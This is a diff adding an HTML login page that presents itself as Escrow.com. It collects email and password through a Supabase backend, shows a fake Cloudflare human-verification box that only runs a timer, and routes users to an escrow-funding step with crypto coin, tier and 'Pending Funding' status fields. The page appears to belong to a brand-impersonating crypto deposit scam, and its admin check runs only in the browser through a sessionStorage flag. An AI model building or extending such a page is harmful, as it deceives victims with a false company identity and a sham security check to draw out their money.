@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login to Escrow.com</title>
+
+<link rel="stylesheet" href="alert-system.css">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+background:#f4f4f4;
+font-family:Arial,sans-serif;
+}
+
+.topbar{
+background:#fff;
+height:60px;
+display:flex;
+align-items:center;
+padding:0 20px;
+box-shadow:0 2px 8px rgba(0,0,0,.08);
+}
+
+.logo-wrap{
+display:flex;
+align-items:center;
+gap:10px;
+}
+
+.logo{
+font-size:18px;
+font-weight:700;
+color:#004f86;
+letter-spacing:1px;
+}
+
+.container{
+    width:100%;
+    max-width:420px;
+    margin:12px auto;
+    padding:0 12px;
+}
+
+h1 {
+    text-align: center;
+    font-size: 18px;
+    color: #555;
+    margin-bottom: 20px;
+}
+
+label{
+display:block;
+font-size:10px;
+letter-spacing:1px;
+color:#444;
+margin-bottom:8px;
+}
+
+label span{
+color:red;
+}
+
+.input-box {
+    height: 40px;
+    background: #fff;
+    border: 2px solid #cfd4d7;
+    display: flex;
+    align-items: center;
+    margin-bottom: 18px;
+    border-radius: 4px;
+}
+
+.input-box i {
+    width: 42px;
+    font-size: 18px;
+    color: #666;
+    text-align: center;
+    border-right: 2px solid #cfd4d7;
+}
+
+.input-box input{
+flex:1;
+height:100%;
+border:none;
+outline:none;
+padding:0 15px;
+font-size:14px;
+background:none;
+}
+
+/* =========================
+   VERIFICATION BOX
+========================= */
+
+.captcha{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:10px;
+    border:1px solid #ddd;
+    border-radius:6px;
+    margin-bottom:15px;
+}
+
+.captcha-box{
+    width:20px;
+    height:20px;
+    border:2px solid #333;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+}
+
+.captcha-box.loading{
+    border-radius:50%;
+    border:3px solid #ccc;
+    border-top:3px solid #3DBB57;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    100%{transform:rotate(360deg);}
+}
+
+.captcha-box.success{
+    background:#3DBB57;
+    color:#fff;
+    border-color:#3DBB57;
+}
+
+.captcha-left{
+    display:flex;
+    align-items:center;
+    gap:12px;
+}
+
+.captcha-text{
+    font-size:14px;
+    color:#333;
+}
+
+.captcha-right {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+    margin-left: auto;
+    text-align: center;
+}
+
+.cf-logo {
+    width: 40px;
+    height: auto;
+    object-fit: contain;
+    display: block;
+}
+
+.CF{
+    font-size:10px;
+    font-weight:bold;
+    letter-spacing:1.5px;
+}
+
+.CF-links{
+    font-size:10px;
+    color:#777;
+}
+
+.login-btn {
+    width: 100%;
+    height: 40px;
+    border: none;
+    background: #71cc88;
+    color: #fff;
+    margin-top:10px;
+    font-size: 16px;
+    font-weight: bold;
+    border-radius: 6px;
+    cursor: pointer;
+}
+
+.or{
+text-align:center;
+font-size:14px;
+color:#666;
+margin-top:50px;
+margin-bottom:18px;
+}
+
+.register-btn {
+    
+    width: 100%;
+    
+    height: 40px;
+    
+    background: #fff;
+    
+    border: 3px solid #71cc88;
+    
+    font-size: 20px;
+    
+    font-weight: bold;
+    
+    color: #50b96b;
+    
+    border-radius: 6px;
+    
+    cursor: pointer;
+    
+    /* ADD THESE */
+    
+    display: flex;
+    
+    align-items: center;
+    
+    justify-content: center;
+    
+    text-decoration: none;
+    
+}
+
+</style>
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+</head>
+<body>
+
+<header class="topbar">
+    <div class="logo-wrap">
+        <div class="logo">ESCROW.COM</div>
+    </div>
+</header>
+
+<div class="container">
+
+    <h1>Login to Escrow.com</h1>
+
+    <label>PLEASE ENTER YOUR EMAIL ADDRESS<span>*</span></label>
+
+    <div class="input-box">
+
+    <i class="fa-regular fa-envelope"></i>
+
+    <input
+    type="email"
+    id="email"
+    placeholder="Email">
+
+</div>
+
+    <label>PLEASE ENTER YOUR PASSWORD<span>*</span></label>
+
+    <div class="input-box">
+        <i class="fa-solid fa-lock"></i>
+        <input type="password" id="password" placeholder="Password">
+    </div>
+
+   <div class="captcha">
+
+    <div class="captcha-left">
+
+        <div
+        class="captcha-box"
+        id="captcha">
+        </div>
+
+        <span id="captchaText">
+
+    Verify you're human
+    
+</span>
+
+    </div>
+
+    <div class="captcha-right">
+
+        <img
+        class="cf-logo"
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTwLqLYQIJOcDVjey4Dy7q9K0FMioQUHyX5A&s">
+
+        <div class="CF">
+            CLOUDFLARE
+        </div>
+
+        <div class="CF-links">
+            Privacy • Help
+        </div>
+
+    </div>
+
+</div>
+
+   <button
+class="login-btn"
+id="loginBtn">
+
+Secure Login
+
+</button>
+
+    <div class="or">- OR -
+    </div>
+    
+    
+  <a
+href="signup.html"
+class="register-btn">
+
+Register An Account
+
+</a>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="supabase.js"></script>
+
+<script src="alert-system.js"></script>
+
+<script>
+
+let captchaDone = false;
+
+const captcha = document.getElementById("captcha");
+const captchaText = document.getElementById("captchaText");
+
+// CAPTCHA
+captcha.addEventListener("click", () => {
+    if (captchaDone) return;
+    captchaText.innerText = "Verifying";
+    captcha.classList.add("loading");
+
+    setTimeout(() => {
+        captcha.classList.remove("loading");
+        captcha.classList.add("success");
+        captcha.innerHTML = "✓";
+        captchaDone = true;
+        captchaText.style.display = "none";
+    }, 2500);
+});
+
+// FIXED LOGIN
+document.getElementById("loginBtn").addEventListener("click", async () => {
+
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!email || !password) {
+        alert("Fill all fields");
+        return;
+    }
+
+    if (!captchaDone) {
+        alert("Complete captcha");
+        return;
+    }
+
+    // Email format validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+        alert("Please enter a valid email address.");
+        return;
+    }
+
+    try {
+        // First try to login with Supabase Auth
+        const { data, error } = await supabaseClient.auth.signInWithPassword({
+            email,
+            password
+        });
+
+        if (error) {
+            if (error.message.includes("Email not confirmed")) {
+                alert("Please check your email and click the confirmation link before logging in.");
+            } else if (error.message.includes("Invalid login credentials")) {
+                alert("Invalid email or password. Please try again.");
+            } else {
+                alert(error.message);
+            }
+            return;
+        }
+
+        // If login successful, ensure user exists in custom 'users' table
+        let { data: userProfile, error: profileError } = await supabaseClient
+            .from("users")
+            .select("*")
+            .eq("id", data.user.id)
+            .maybeSingle();
+
+        if (!userProfile) {
+            // Auto-create profile if missing
+            const pendingJoin = JSON.parse(localStorage.getItem("pendingJoin"));
+
+            const { error: insertError } = await supabaseClient
+                .from("users")
+                .insert({
+                    id: data.user.id,
+                    email: email,
+                    name: email.split("@")[0],
+                    tier: pendingJoin ? pendingJoin.tier : null,
+                    coin: pendingJoin ? pendingJoin.coin : null,
+                    amount: pendingJoin ? pendingJoin.amount : 0,
+                    balance: 0,
+                    contract_number: null,
+                    funding_status: "not_started",
+                    account_status: "Pending Funding",
+                    approved: false,
+                    current_milestone: 0,
+                });
+
+            if (insertError) {
+                console.error(insertError);
+            }
+
+            // Re-fetch profile
+            const { data: newProfile } = await supabaseClient
+                .from("users")
+                .select("*")
+                .eq("id", data.user.id)
+                .single();
+
+            userProfile = newProfile;
+        }
+
+        if (profileError && !userProfile) {
+            alert("Failed to load user profile.");
+            return;
+        }
+
+        // Pending join logic
+        const pendingJoin = JSON.parse(localStorage.getItem("pendingJoin"));
+        if (pendingJoin) {
+            await supabaseClient
+                .from("users")
+                .update({
+                    tier: pendingJoin.tier,
+                    coin: pendingJoin.coin,
+                    amount: pendingJoin.amount
+                })
+                .eq("id", data.user.id);
+
+            userProfile.tier = pendingJoin.tier;
+            userProfile.coin = pendingJoin.coin;
+            userProfile.amount = pendingJoin.amount;
+            localStorage.removeItem("pendingJoin");
+        }
+
+        localStorage.setItem("user", JSON.stringify(userProfile));
+
+        // Admin check
+        const ADMIN_EMAIL = "admin@escrow.com";
+        if (userProfile.email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
+            sessionStorage.setItem("isAdmin", "true");
+            window.location.href = "admin.html";
+            return;
+        }
+
+        sessionStorage.removeItem("isAdmin");
+
+        // Routing
+        switch (userProfile.funding_status) {
+            case "not_started":
+                window.location.href = "escrow-funding.html";
+                break;
+            case "pending":
+                alert("Your payment has been received and is currently under review.");
+                break;
+            case "approved":
+                window.location.href = "dashboard.html";
+                break;
+            case "rejected":
+                alert("Your payment could not be verified. Please submit a new payment.");
+                window.location.href = "escrow-funding.html";
+                break;
+            default:
+                window.location.href = "escrow-funding.html";
+        }
+
+    } catch (err) {
+        console.error(err);
+        alert("An unexpected error occurred.");
+    }
+});
+
+</script>
+
+</body>
+</html>
